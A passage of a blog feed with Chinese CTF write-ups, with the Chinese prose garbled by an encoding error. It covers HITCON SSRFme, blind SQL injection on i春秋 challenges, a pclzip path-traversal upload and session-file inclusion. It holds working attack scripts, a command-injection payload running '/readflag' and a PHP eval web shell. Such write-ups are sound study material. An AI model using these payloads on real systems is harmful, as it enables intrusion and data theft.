src="/2021/06/08/hitcon-2017-ssrfme/image-20210608212926383.png" alt="image-20210608212926383"></p><p><code>ç„¶åŽreadflagï¼Œå¦‚æžœç›´æŽ¥/readflagçš„è¯ï¼Œé‚£ä¹ˆä¼šåœ¨æœåŠ¡å™¨çš„æ ¹ç›®å½•åˆ›å»ºè¿™ä¸ªæ–‡ä»¶ï¼Œè€Œä¸æ˜¯åœ¨ç½‘ç«™çš„é‚£ä¸ªç›®å½•ï¼Œæ‰€ä»¥æ˜¯æ— æ³•å‘½ä»¤æ‰§è¡Œçš„ï¼Œæ‰€ä»¥å¯ä»¥ç”¨bash -c ç›¸å½“äºŽ./readflagï¼Œè€Œæ ¹æ®phpå­—ç¬¦è§£æžç‰¹æ€§ï¼Œå¦‚æžœç›´æŽ¥å°†./readflagä¼ å…¥ï¼Œé‚£ä¹ˆ.å°±ä¼šå˜æˆä¸‹åˆ’çº¿,ä»Žè€Œä¸èƒ½å‘½ä»¤æ‰§è¡Œã€‚ç›´æŽ¥bashçš„è¯å¥½åƒæ˜¯åªèƒ½bash æœ‰shåŽç¼€çš„æ–‡ä»¶ï¼Œæ‰€ä»¥ä¸èƒ½ç”¨</code><br><code>ç»¼ä¸Šæ‰€è¿°ï¼Œbash -c æ˜¯æœ€å¥½çš„é€‰æ‹©</code><br>åŒæ ·è¿è¡Œä¸¤é</p><pre><code>?url=file:bash -c /readflag|&amp;filename=bash -c /readflag|</code></pre><p>è¿›åˆ°è·¯å¾„å³å¯</p><pre><code>sandbox/fb8ca607c1b8f0bf763cbac72b8b6875/bash%20-c%20/readflag%7C</code></pre><p><img src="/2021/06/08/hitcon-2017-ssrfme/image-20210608213537379.png" alt="image-20210608213537379"></p><p>è„šæœ¬ï¼š</p><pre><code>#coding:utf-8import requestsurl = 'http://678e005f-4a09-4a0a-8fc8-4c03bc330ef3.node3.buuoj.cn/'exp = 'file:bash -c /readflag|'payload = "?url={}&amp;filename=data"see = 'sandbox/fb8ca607c1b8f0bf763cbac72b8b6875/data'r = requests.get(url = url+payload.format(exp))r = requests.get(url+see)print(r.text)</code></pre><p><img src="/2021/06/08/hitcon-2017-ssrfme/image-20210608214022020.png" alt="image-20210608214022020"></p>]]></content>
      
      
      
        <tags>
            
            <tag> HITCON </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>iæ˜¥ç§‹:Web-SQLi</title>
      <link href="2021/06/07/i-chun-qiu-web-sqli/"/>
      <url>2021/06/07/i-chun-qiu-web-sqli/</url>
      
        <content type="html"><![CDATA[<p><img src="/2021/06/07/i-chun-qiu-web-sqli/image-20210607225651935.png" alt="image-20210607225651935"></p><p>ä¸€ä¸ªç™»å½•ç•Œé¢æ—¢ç„¶é¢˜ç›®å«sqlié‚£è‚¯å®šæ˜¯sql</p><p><img src="/2021/06/07/i-chun-qiu-web-sqli/image-20210607225805955.png" alt="image-20210607225805955"></p><pre><code>admin%1$\' or 1=1%23</code></pre><p><img src="/2021/06/07/i-chun-qiu-web-sqli/image-20210607230059922.png" alt="image-20210607230059922"></p><pre><code>#coding:utf-8import requestsimport stringdic = string.digits + string.ascii_letters + "!@#$%^&amp;*()_+{}-="right = 'password error!'worry = 'username error!'url = 'http://647d77bb3d224bd6b0e119263756c4a6dcbd242aaa264463.changame.ichunqiu.com/'for i in range(30):    key = "admin%1$\\' or " + "(length(database())=" + str(i) + ")#"    data = {'username':key, 'password':'111'}    r = requests.post(url, data=data).content    if right in str(r):        print('the length of database is %s' %i)</code></pre><p><img src="/2021/06/07/i-chun-qiu-web-sqli/image-20210607224654856.png" alt="image-20210607224654856"></p><pre><code>import requestsimport stringdic = string.digits + string.ascii_letters + "!@#$%^&amp;*()_+{}-="right = 'password error!'worry = 'username error!'url = 'http://647d77bb3d224bd6b0e119263756c4a6dcbd242aaa264463.changame.ichunqiu.com/'database = ''for j in range(1,4):    for each in dic:        key = "admin%1$\\' or " + "(ascii(substr(database(),%s,1))="%j + str(ord(each)) + ")#"        data = {'username':key, 'password':'111'}        r = requests.post(url, data=data).content        print(key)        if right in str(r):            database += each            print(each)            breakprint('the name of database is %s'%database)</code></pre><p><img src="/2021/06/07/i-chun-qiu-web-sqli/image-20210607224940467.png" alt="image-20210607224940467"></p><pre><code>import requestsimport stringdic = string.digits + string.ascii_letters + "!@#$%^&amp;*()_+{}-="right = 'password error!'worry = 'username error!'url = 'http://647d77bb3d224bd6b0e119263756c4a6dcbd242aaa264463.changame.ichunqiu.com/'i = 1while True:    key = "admin%1$\\' or " + "(select length(table_name) from information_schema.tables where table_schema=database() limit 0,1)=" + str(i) + "#"    data = {'username':key, 'password':'111'}    r = requests.post(url, data=data).content    print(r)    if right in str(r):        print('the length of tables is %s' %i)        break    i += 1</code></pre><p><img src="/2021/06/07/i-chun-qiu-web-sqli/image-20210607225024967.png" alt="image-20210607225024967"></p><pre><code>import requestsimport stringdic = string.digits + string.ascii_letters + "!@#$%^&amp;*()_+{}-="right = 'password error!'worry = 'username error!'url = 'http://647d77bb3d224bd6b0e119263756c4a6dcbd242aaa264463.changame.ichunqiu.com/'table = ''for i in range(1,5):    for j in dic:        key = "admin%1$\\' or " + "(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),%s,1))="%i + str(ord(j)) + ")#"        data = {'username':key, 'password':'111'}        r = requests.post(url, data=data).content        print(key)        if right in str(r):            table += j            print(j)            breakprint('the name of table is %s'%table)</code></pre><p><img src="/2021/06/07/i-chun-qiu-web-sqli/image-20210607225144418.png" alt="image-20210607225144418"></p><pre><code>import requestsimport stringdic = string.digits + string.ascii_letters + "!@#$%^&amp;*()_+{}-="right = 'password error!'worry = 'username error!'url = 'http://647d77bb3d224bd6b0e119263756c4a6dcbd242aaa264463.changame.ichunqiu.com/'i = 1while True:    key = "admin%1$\\' or " + "(select length(column_name) from information_schema.columns where table_name=0x666c6167 limit 0,1)=" + str(i) + "#"    data = {'username':key, 'password':'111'}    r = requests.post(url, data=data).content    print(r)    if right in str(r):        print('the length of columns is %s' %i)        break    i += 1</code></pre><p><img src="/2021/06/07/i-chun-qiu-web-sqli/image-20210607225256654.png" alt="image-20210607225256654"></p><pre><code>import requestsimport stringdic = string.digits + string.ascii_letters + "!@#$%^&amp;*()_+{}-="right = 'password error!'worry = 'username error!'url = 'http://647d77bb3d224bd6b0e119263756c4a6dcbd242aaa264463.changame.ichunqiu.com/'for i in range(1,5):    for j in dic:        key = "admin%1$\\' or " + "(ascii(substr((select column_name from information_schema.columns where table_name=0x666c6167 limit 0,1),%s,1))="%i + str(ord(j)) + ")#"        data = {'username':key, 'password':'111'}        r = requests.post(url, data=data).content        print(key)        if right in str(r):            column += j            print(j)            breakprint('the name of column is %s'%column)</code></pre><pre><code>import requestsimport stringdic = string.digits + string.ascii_letters + "!@#$%^&amp;*()_+{}-="right = 'password error!'worry = 'username error!'url = 'http://647d77bb3d224bd6b0e119263756c4a6dcbd242aaa264463.changame.ichunqiu.com/'i = 1while True:    key = "admin%1$\\' or " + "(select length(flag) from flag limit 0,1)=" + str(i) + "#"    data = {'username':key, 'password':'111'}    r = requests.post(url, data=data).content    print(key)    if right in str(r):        print('the length of data is %s' %i)        break    i += 1</code></pre><pre><code>import requestsimport stringdic = string.digits + string.ascii_letters + "!@#$%^&amp;*()_+{}-="right = 'password error!'worry = 'username error!'url = 'http://647d77bb3d224bd6b0e119263756c4a6dcbd242aaa264463.changame.ichunqiu.com/'flag = ''for i in range(1,43):    for j in dic:        key = "admin%1$\\' or " + "(ascii(substr((select flag from flag limit 0,1),%s,1))="%i + str(ord(j)) + ")#"        data = {'username':key, 'password':'111'}        r = requests.post(url, data=data).content        print(key)        if right in str(r):            flag += j            print(j)            breakprint('the flag is %s'%flag)</code></pre><pre><code>import requestsimport stringdic = string.digits + string.ascii_letters + "!@#$%^&amp;*()_+{}-="right = 'password error!'worry = 'username error!'url = 'http://647d77bb3d224bd6b0e119263756c4a6dcbd242aaa264463.changame.ichunqiu.com/'flag = ''for i in range(1,43):    for j in dic:        key = "admin%1$\\' or " + "(ascii(substr((select flag from flag limit 0,1),%s,1))="%i + str(ord(j)) + ")#"        data = {'username':key, 'password':'111'}        r = requests.post(url, data=data).content        print(key)        if right in str(r):            flag += j            print(j)            breakprint('the flag is %s'%flag)</code></pre><p><img src="/2021/06/07/i-chun-qiu-web-sqli/image-20210607230115026.png" alt="image-20210607230115026"></p><p>å‚è€ƒ<a href="https://blog.csdn.net/nzjdsds/article/details/82152085">https://blog.csdn.net/nzjdsds/article/details/82152085</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> iæ˜¥ç§‹ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€Šä»Ž0åˆ°1ï¼šCTFeræˆé•¿ä¹‹è·¯ã€‹:thinkphpååºåˆ—åŒ–åˆ©ç”¨é“¾</title>
      <link href="2021/06/06/cong-0-dao-1-ctfer-cheng-chang-zhi-lu-thinkphp-fan-xu-lie-hua-li-yong-lian/"/>
      <url>2021/06/06/cong-0-dao-1-ctfer-cheng-chang-zhi-lu-thinkphp-fan-xu-lie-hua-li-yong-lian/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
        <tags>
            
            <tag> ã€Šä»Ž0åˆ°1ï¼šCTFeræˆé•¿ä¹‹è·¯ã€‹ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€Šä»Ž0åˆ°1ï¼šCTFeræˆé•¿ä¹‹è·¯ã€‹:æ–‡ä»¶ä¸Šä¼ </title>
      <link href="2021/06/05/cong-0-dao-1-ctfer-cheng-chang-zhi-lu-wen-jian-shang-chuan/"/>
      <url>2021/06/05/cong-0-dao-1-ctfer-cheng-chang-zhi-lu-wen-jian-shang-chuan/</url>
      
        <content type="html"><![CDATA[<pre><code>&lt;?phpheader("Content-Type:text/html; charset=utf-8");// æ¯5åˆ†é’Ÿä¼šæ¸…é™¤ä¸€æ¬¡ç›®å½•ä¸‹ä¸Šä¼ çš„æ–‡ä»¶require_once('pclzip.lib.php');if(!$_FILES){    show_source(__FILE__);}else{    $file = $_FILES['file'];    if(!$file){        exit("è¯·å‹¿ä¸Šä¼ ç©ºæ–‡ä»¶");    }    $name = $file['name'];    $dir = 'upload/';    $ext = strtolower(substr(strrchr($name, '.'), 1));    $path = $dir.$name;    function check_dir($dir){        $handle = opendir($dir);        while(($f = readdir($handle)) !== false){            if(!in_array($f, array('.', '..'))){                if(is_dir($dir.$f)){                    check_dir($dir.$f.'/');                 }else{                    $ext = strtolower(substr(strrchr($f, '.'), 1));                    if(!in_array($ext, array('jpg', 'gif', 'png'))){                        unlink($dir.$f);                    }                }            }        }    }    if(!is_dir($dir)){        mkdir($dir);    }    $temp_dir = $dir.md5(time(). rand(1000,9999));    if(!is_dir($temp_dir)){        mkdir($temp_dir);    }    if(in_array($ext, array('zip', 'jpg', 'gif', 'png'))){        if($ext == 'zip'){            $archive = new PclZip($file['tmp_name']);            foreach($archive-&gt;listContent() as $value){                $filename = $value["filename"];                if(preg_match('/\.php$/', $filename)){                     exit("åŽ‹ç¼©åŒ…å†…ä¸å…è®¸å«æœ‰phpæ–‡ä»¶!");                 }            }            if ($archive-&gt;extract(PCLZIP_OPT_PATH, $temp_dir, PCLZIP_OPT_REPLACE_NEWER) == 0) {                check_dir($dir);                   exit("è§£åŽ‹å¤±è´¥");            }            check_dir($dir);            exit('ä¸Šä¼ æˆåŠŸ!');        }else{            move_uploaded_file($file['tmp_name'], $temp_dir.'/'.$file['name']);            check_dir($dir);            exit('ä¸Šä¼ æˆåŠŸ!');        }    }else{        exit('ä»…å…è®¸ä¸Šä¼ zipã€jpgã€gifã€pngæ–‡ä»¶!');    }}</code></pre><p>æ­£åˆ™è¡¨è¾¾å¼è¿‡æ»¤äº†ä»¥.phpç»“å°¾çš„æ–‡ä»¶</p><p>ä»…å…è®¸ä¸Šä¼ zipã€jpgã€gifã€pngæ–‡ä»¶</p><p>apacheçš„è§£æžæ¼æ´žã€‚å³æž„é€ xxxx.php.xxxï¼Œåªè¦æœ€åŽçš„xxxä¸èƒ½è¢«è§£æžï¼Œä¼šç»§ç»­å‘å·¦è§£æžï¼Œå› æ­¤phpå¯ä»¥æˆåŠŸè¢«è§£æž</p><pre><code>if ($archive-&gt;extract(PCLZIP_OPT_PATH, $temp_dir, PCLZIP_OPT_REPLACE_NEWER) == 0) {                check_dir($dir);                   exit("è§£åŽ‹å¤±è´¥");            }</code></pre><pre><code>åœ¨åŽ‹ç¼©åŒ…è§£åŽ‹å¤±è´¥åŽï¼Œä¼šå…ˆåˆ é™¤ç›®å½•ä¸‹çš„éžæ³•æ–‡ä»¶åŽå†é€€å‡ºï¼Œæ‰€ä»¥æž„é€ ç‰¹æ®ŠåŽ‹ç¼©åŒ…ï¼ˆè§£åŽ‹åˆ°ä¸€ä¼´é€€å‡ºï¼‰æ–¹æ³•åœ¨æ­¤å¤„ä¸å¯ç”¨ã€‚ä»Žä»£ç ä¸­å¯çŸ¥ï¼Œcheck_diræ–¹æ³•åªä¼šé€’å½’æ£€æµ‹uploadç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶ï¼Œæ ¹æ®ä¹¦ä¸­å†…å®¹å¯çŸ¥pclzipå­˜åœ¨ç›®å½•ç©¿è¶Šé—®é¢˜ã€‚å¦‚æžœå°†è§£åŽ‹å‡ºçš„æ–‡ä»¶ç©¿è¶Šåˆ°éžuploadç›®å½•ï¼Œcheck__diræ–¹æ³•å°±æ— æ³•åˆ é™¤è¯¥æ–‡ä»¶ã€‚zipåŽ‹ç¼©åŒ…è¢«è§£åŽ‹åˆ°/upload/éšæœºmd5/ç›®å½•ä¸‹ï¼Œæ‰€ä»¥éœ€è¦ç©¿è¶Šä¸¤ä¸ªç›®å½•ã€‚</code></pre><p>é¦–å…ˆå°±æ˜¯ä¸‹è½½010 Editorï¼Œç„¶åŽç ´è§£ï¼Œè¿™äº›å¯ä»¥ç½‘ä¸ŠæŸ¥ã€‚<br>ç„¶åŽå°±æ˜¯ä½¿ç”¨äº†ã€‚å·¦ä¸Šè§’fileï¼Œç„¶åŽnew fileï¼Œæ‰“å¼€zipï¼š<br><img src="https://img-blog.csdnimg.cn/20201011142253801.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3JmcmRlcg==,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å¦‚æžœæ²¡æœ‰ä¸‹é¢çš„é‚£ä¸ªï¼Œéœ€è¦æ‰‹åŠ¨æ‰“å¼€ï¼š<br><img src="https://img-blog.csdnimg.cn/20201011142334385.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3JmcmRlcg==,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è¿™æ—¶å€™æˆ‘ä»¬ä¼šçœ‹åˆ°ï¼Œå‘½åæˆ‘çš„zipé‡Œåªæœ‰ä¸€ä¸ªæ–‡ä»¶ï¼Œä½†æ˜¯å´æ˜¾ç¤º2ä¸ªï¼š<br><img src="https://img-blog.csdnimg.cn/20201011142403699.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>è¿™æ—¶å€™ï¼Œæˆ‘ä»¬éœ€è¦ä¿®æ”¹ç¬¬äºŒä¸ªï¼š<img src="https://img-blog.csdnimg.cn/20201011142436547.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3JmcmRlcg==,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>æ³¨æ„ushort deFileNameâ€¦é‚£é‡Œï¼Œé‚£ä¸ª20å°±æ˜¯ä½ æ–‡ä»¶åå­—çš„é•¿åº¦ã€‚<br>ç„¶åŽæˆ‘ä»¬æ”¹æˆè¦æž„é€ çš„åå­—ï¼š</p><p><img src="https://img-blog.csdnimg.cn/20201011142543519.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3JmcmRlcg==,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>ç„¶åŽåœ¨localhostè®¿é—®å³å¯</p>]]></content>
      
      
      
        <tags>
            
            <tag> ã€Šä»Ž0åˆ°1ï¼šCTFeræˆé•¿ä¹‹è·¯ã€‹ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>iæ˜¥ç§‹:Web-æ”»å‡»</title>
      <link href="2021/06/04/i-chun-qiu-web-gong-ji/"/>
      <url>2021/06/04/i-chun-qiu-web-gong-ji/</url>
      
        <content type="html"><![CDATA[<pre><code> &lt;?phpheader("content-type:text/html;charset=utf-8");show_source(__FILE__);echo '&lt;pre&gt;';include('u/ip.php');include('flag.php');if (in_array($_SERVER['REMOTE_ADDR'],$ip)){  die("æ‚¨çš„ipå·²è¿›å…¥ç³»ç»Ÿé»‘åå•");}var_dump($ip);if ($_POST[substr($flag,5,3)]=='attack'){  echo $flag;}else if (count($_POST)&gt;0){  $ip = '$ip[]="'.$_SERVER['REMOTE_ADDR'].'";'.PHP_EOL;   file_put_contents('u/ip.php',$ip,FILE_APPEND);}echo '&lt;/pre&gt;';array(0) {}</code></pre><p>ç»è¿‡å®¡è®¡ï¼Œè¦æ±‚ä½ postä¼ å…¥çš„å‚æ•°å†…å®¹æ˜¯attackï¼Œåå­—å¿…é¡»å’Œflagä»Žç¬¬äº”ä½å¼€å§‹å¾€åŽä¸‰ä½ä¸€æ ·æ‰è¡Œã€‚è€Œä¸”ä¼šæ£€æµ‹REMOTE_ADDRï¼Œè¿™ä¸ªä¸œè¥¿æ˜¯æ²¡æ³•ä¼ªé€ çš„ï¼Œæ¯ä¸ªäººåªæœ‰ä¸€æ¬¡æœºä¼šã€‚</p><pre><code>import requestsa = "1234567890abcdef"data = {}for i in a:    for j in a:        for k in a:            data[i+j+k]="attack"print(data)url='http://f5cbfc1ababd4d9bb04abd665fbeeada3d10cb45b099418f.changame.ichunqiu.com/'r=requests.post(url,data=data)print(r.text)</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> iæ˜¥ç§‹ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>iæ˜¥ç§‹:Web-Notebook</title>
      <link href="2021/06/03/i-chun-qiu-web-notebook/"/>
      <url>2021/06/03/i-chun-qiu-web-notebook/</url>
      
        <content type="html"><![CDATA[<p>tipsï¼š æ–‡ä»¶åŒ…å«phpinfoæ˜¯ä¸æ˜¯æœ‰æ–°çš„å‘çŽ°</p><p>æ‰“å¼€f12èŽ·å–åˆ°PHPSESSIONä¸ºei4obnmvtlkbt57muuj4kh6f92ï¼Œä½†ä¸ºæ–‡ä»¶æ—¶åˆ™ä¸ºei4obnmvtlkbt57muuj4kh6f92ã€‚</p><p><img src="/2021/06/03/i-chun-qiu-web-notebook/image-20210603195929708.png" alt="image-20210603195929708"></p><p>åˆ›å»ºç”¨æˆ·</p><pre><code>&lt;?php @eval($_POST[cmd]);?&gt;</code></pre><p>ç™»å½•</p><p>è®¿é—®ï¼š</p><pre><code>http://8232dd75fdf94633b62235ec0315dc5e619bd981bd404025.changame.ichunqiu.com/action.php?module=&amp;file=../../../tmp/SESS/sess_ei4obnmvtlkbt57muuj4kh6f92</code></pre><p>é‡‡ç”¨hackbaræ›´æ”¹postæ•°æ®</p><p>cmdä¹‹åŽçš„å‘½ä»¤ä¼šè¢«æ‰§è¡Œ</p><p><img src="/2021/06/03/i-chun-qiu-web-notebook/image-20210603195017909.png" alt="image-20210603195017909"></p><p><img src="/2021/06/03/i-chun-qiu-web-notebook/image-20210603194950513.png" alt="image-20210603194950513"></p><p>æŸ¥çœ‹f12</p><p><img src="/2021/06/03/i-chun-qiu-web-notebook/image-20210603195255484.png" alt="image-20210603195255484"></p>]]></content>
      
      
      
        <tags>
            
            <tag> iæ˜¥ç§‹ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>iæ˜¥ç§‹:Web-Manager</title>
      <link href="2021/06/02/i-chun-qiu-web-manager/"/>
      <url>2021/06/02/i-chun-qiu-web-manager/</url>
      
        <content type="html"><![CDATA[<p><img src="/2021/06/02/i-chun-qiu-web-manager/image-20210603184940414.png" alt="image-20210603184940414"></p><p>å‘çŽ°_nonce</p><p>æ‰«æåŽå°ï¼š</p><p>è¿›å…¥</p><pre><code>url/sources/login.js</code></pre><pre><code>$(document).keydown(function(e) {    if (e.keyCode == 222 || e.keyCode == 188 || e.keyCode == 190) {        alert("Illegal character");        return false;    }});function getnonce() {    var text = "";    var possible = "0123456789abcdef";    for (var i = 0; i &lt; 40; i++)        text += possible.charAt(Math.floor(Math.random() * possible.length));    return text;}$('#submit').click(function() {    this._nonce = getnonce();});</code></pre><pre><code>url/sources/bootstrap.js</code></pre><pre><code>  $(document).on('click.bs.alert.data-api', dismiss, Alert.prototype.close)}(jQuery);function sign (data, key) {    var privateKey    var i, j    var W = new Array(80)    var A, B, C, D, E    var H0 = 0x97B5D3F1    var H1 = 0x1F3D5B79    var H2 = 0x684A2C0E    var H3 = 0xE0C2A486    var H4 = 0x33221100    var H5 = 0xF0F0F0F0    var temp    var _RSA = function (n, s) {        var t4 = (n &lt;&lt; s) | (n &gt;&gt;&gt; (32 - s))        return t4    }    var _Rot = function (val) {        var str = ''        var i        var v        for (i = 7; i &gt;= 0; i--) {            v = (val &gt;&gt;&gt; (i * 4)) &amp; 0x0f            str += v.toString(16)        }        return str    }    str = unescape(encodeURIComponent(key + data))    var strLen = str.length    var wordArray = []    for (i = 0; i &lt; strLen - 3; i += 4) {        j = str.charCodeAt(i) &lt;&lt; 24 |            str.charCodeAt(i + 1) &lt;&lt; 16 |            str.charCodeAt(i + 2) &lt;&lt; 8 |            str.charCodeAt(i + 3)        wordArray.push(j)    }    switch (strLen % 4) {        case 0:            i = 0x080000000            break        case 1:            i = str.charCodeAt(strLen - 1) &lt;&lt; 24 | 0x0800000            break        case 2:            i = str.charCodeAt(strLen - 2) &lt;&lt; 24 | str.charCodeAt(strLen - 1) &lt;&lt; 16 | 0x08000            break        case 3:            i = str.charCodeAt(strLen - 3) &lt;&lt; 24 |                str.charCodeAt(strLen - 2) &lt;&lt; 16 |                str.charCodeAt(strLen - 1) &lt;&lt;            8 | 0x80            break    }    wordArray.push(i)    while ((wordArray.length % 16) !== 14) {        wordArray.push(0)    }    wordArray.push(strLen &gt;&gt;&gt; 29)    wordArray.push((strLen &lt;&lt; 3) &amp; 0x0ffffffff)    H0 ^= H5    H1 ^= H5    H2 ^= H5    H3 ^= H5    H4 ^= H5    for (privateKey = 0; privateKey &lt; wordArray.length; privateKey += 16) {        for (i = 0; i &lt; 16; i++) {            W[i] = wordArray[privateKey + i]        }        for (i = 16; i &lt;= 79; i++) {            W[i] = _RSA(W[i - 3] ^ W[i - 8] ^ W[i - 14] ^ W[i - 16], 1)        }        A = H0        B = H1        C = H2        D = H3        E = H4        for (i = 0; i &lt;= 19; i++) {            temp = (_RSA(A, 5) + ((B &amp; C) | (~B &amp; D)) + 0x5A820000 + E + W[i] + 0x00007999) &amp; 0x0ffffffff            E = D            D = C            C = _RSA(B, 30)            B = A            A = temp        }        for (i = 20; i &lt;= 39; i++) {            temp = (_RSA(A, 5) + (B ^ C ^ D) + 0x6ED90000 + E + W[i] + 0x0000EBA1) &amp; 0x0ffffffff            E = D            D = C            C = _RSA(B, 30)            B = A            A = temp        }        for (i = 40; i &lt;= 59; i++) {            temp = (_RSA(A, 5) + ((B &amp; C) | (B &amp; D) | (C &amp; D)) + 0x8F1B0000 + E + W[i] + 0x0000BCDC) &amp; 0x0ffffffff            E = D            D = C            C = _RSA(B, 30)            B = A            A = temp        }        for (i = 60; i &lt;= 79; i++) {            temp = (_RSA(A, 5) + (B ^ C ^ D) + 0xCA620000 + E + W[i] + 0x0000C1D6) &amp; 0x0ffffffff            E = D            D = C            C = _RSA(B, 30)            B = A            A = temp        }        H0 = (H0 + A) &amp; 0x0ffffffff        H1 = (H1 + B) &amp; 0x0ffffffff        H2 = (H2 + C) &amp; 0x0ffffffff        H3 = (H3 + D) &amp; 0x0ffffffff        H4 = (H4 + E) &amp; 0x0ffffffff    }    temp = _Rot(H0) + _Rot(H1) + _Rot(H2) + _Rot(H3) + _Rot(H4)    return temp.toLowerCase()}$(document).ready(function() {    $("#" + "f" + "r" + "m" + "l" + "o" + "g" + "i" + "n").submit(function(e) {        var z1 = $("#" + "u" + "s" + "e" + "r" + "n" + "a" + "m" + "e").val();        var z2 = $("#" + "p" + "a" + "s" + "s" + "w" + "o" + "r" + "d").val();        $('&lt;' + 'i' + 'n' + 'p' + 'u' + 't' + '&gt;').attr({            type: 'h' + 'i' + 'd' + 'd' + 'e' + 'n',            name: '_' + 'n' + 'o' + 'n' + 'c' + 'e',            value: sign(z1 + z2, "YTY" + "0Yj" + "M0Y" + "2Rh" + "ZTZ" + "iMj" + "liZ" + "jFj" + "OTQ" + "xOD" + "==")        }).appendTo('#' + 'f' + 'r' + 'm' + 'l' + 'o' + 'g' + 'i' + 'n');    });});</code></pre><p><img src="/2021/06/02/i-chun-qiu-web-manager/image-20210603183639838.png" alt="image-20210603183639838"></p><p>è¿™é‡Œæ˜¯å¯¹äºŽsignçš„è°ƒç”¨å’Œ_nonceçš„å½¢æˆ</p><p>é€šè¿‡sign()å‡½æ•°å¯ä»¥å¾—åˆ°key å’Œ data æ‹¼æŽ¥æ–¹å¼ã€‚<br> str = unescape(encodeURIComponent(key + data))</p><p>ç”¨è„šæœ¬å§ï¼š</p><pre><code>import hashlibimport requestsurl = "http://03581832d20d4ab59fe85fa2480f3ffce5f10e0fd8d040d7.changame.ichunqiu.com/login.php"headers = {"Content-Type": "application/x-www-form-urlencoded"}suffix = "YTY0YjM0Y2RhZTZiMjliZjFjOTQxOD=="temp = ""for i in range(1, 50):    # æ‰€æœ‰å¯è§å­—ç¬¦    for j in range(32, 127):        # å­—æ®µååŒ…å«ç‰¹æ®Šå­—ç¬¦        payload = "'or ascii(substr(`p@ssw0rd`,{},1)) = {}#".format(            i, j)        info = suffix + payload + "1"        nonce = hashlib.sha1(info.encode("utf-8")).hexdigest()        data = "username={}&amp;password=1&amp;submit=&amp;_nonce={}&amp;a={}".format(payload, nonce, "a" * 21000)        r = requests.post(url, headers=headers, data=data)        # çŒœæµ‹æˆåŠŸçš„è¯·æ±‚é•¿åº¦ä¸º782        if "Incorrect password" in r.content.decode("utf-8"):            temp += chr(j)            print(temp)            break</code></pre><pre><code>MyIchunq1uSuperL0ng&amp;&amp;SecurePa$$word</code></pre><p><img src="/2021/06/02/i-chun-qiu-web-manager/image-20210603190858995.png" alt="image-20210603190858995"></p>]]></content>
      
      
      
        <tags>
            
            <tag> iæ˜¥ç§‹ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>iæ˜¥ç§‹:Web-Look</title>
      <link href="2021/06/01/i-chun-qiu-web-look/"/>
      <url>2021/06/01/i-chun-qiu-web-look/</url>
      
        <content type="html"><![CDATA[<p>æ‰«åŽå°å‘çŽ°vimnifo</p><p>![4fa0c3568642010563a1a97b9a258c9](C:/Users/H3ng/AppData/Local/Temp/WeChat Files/d202b37f60f616720bfa4776b0687a4.png)</p><p>è¿›å…¥5211ec9dde53ee65bb02225117fba1e1.php.backup<del>~</del>å¾—åˆ°å¤‡ä»½æ–‡ä»¶</p><pre><code>&lt;?php$con = mysql_connect('localhost','root','');mysql_query("set names utf8");mysql_select_db("ctf");if($_SERVER["REMOTE_ADDR"]=='8.8.8.8'){    $name = addslashes($_GET['usern3me']);}else{    if(stripos($_GET['usern3me'],'Bctf2O16')!==false){        $name = 'FUCK';    }    else{        $name = addslashes($_GET['usern3me']);    }}echo 'hello '.$name;$sql = "select * from admin where name='$name'";$result = mysql_query($sql);$num = mysql_num_rows($result);if($num&gt;0){    echo '&lt;br&gt;next ***.php';}?&gt;</code></pre><p>ä»£ç å®¡è®¡ï¼š</p><p>æ ¹æ®é¢˜ç›®çš„æç¤ºï¼Œæˆ‘ä»¥ä¸ºæ˜¯å®½å­—èŠ‚æ³¨å…¥ï¼Œä½†æ˜¯å°è¯•ä¹‹åŽå‘çŽ°ä¸è¡Œã€‚å› ä¸ºè¿˜æ˜¯è€è€å®žå®žæƒ³åŠžæ³•ç»•è¿‡Bctf2O16çš„è¿‡æ»¤ã€‚</p><pre><code>MYSQL ä¸­ utf8_unicode_ci å’Œ utf8_general_ci ä¸¤ç§ç¼–ç æ ¼å¼, utf8_general_ciä¸åŒºåˆ†å¤§å°å†™, Ã„ = A, Ã– = O, Ãœ = U è¿™ä¸‰ç§æ¡ä»¶éƒ½æˆç«‹, å¯¹äºŽutf8_general_ciä¸‹é¢çš„ç­‰å¼æˆç«‹ï¼šÃŸ = s ï¼Œä½†æ˜¯ï¼Œå¯¹äºŽutf8_unicode_ciä¸‹é¢ç­‰å¼æ‰æˆç«‹ï¼šÃŸ = ss ã€‚å¯ä»¥çœ‹åˆ°å¤§å†™Oå’ŒÃ–æ˜¯ç›¸ç­‰çš„</code></pre><p>å› æ­¤å¯ä»¥ä½¿ç”¨Ã§=c æˆ–è€…Ã´=o</p><pre><code>5211ec9dde53ee65bb02225117fba1e1.php?usern3me=BÃ§tf2O16</code></pre><p><img 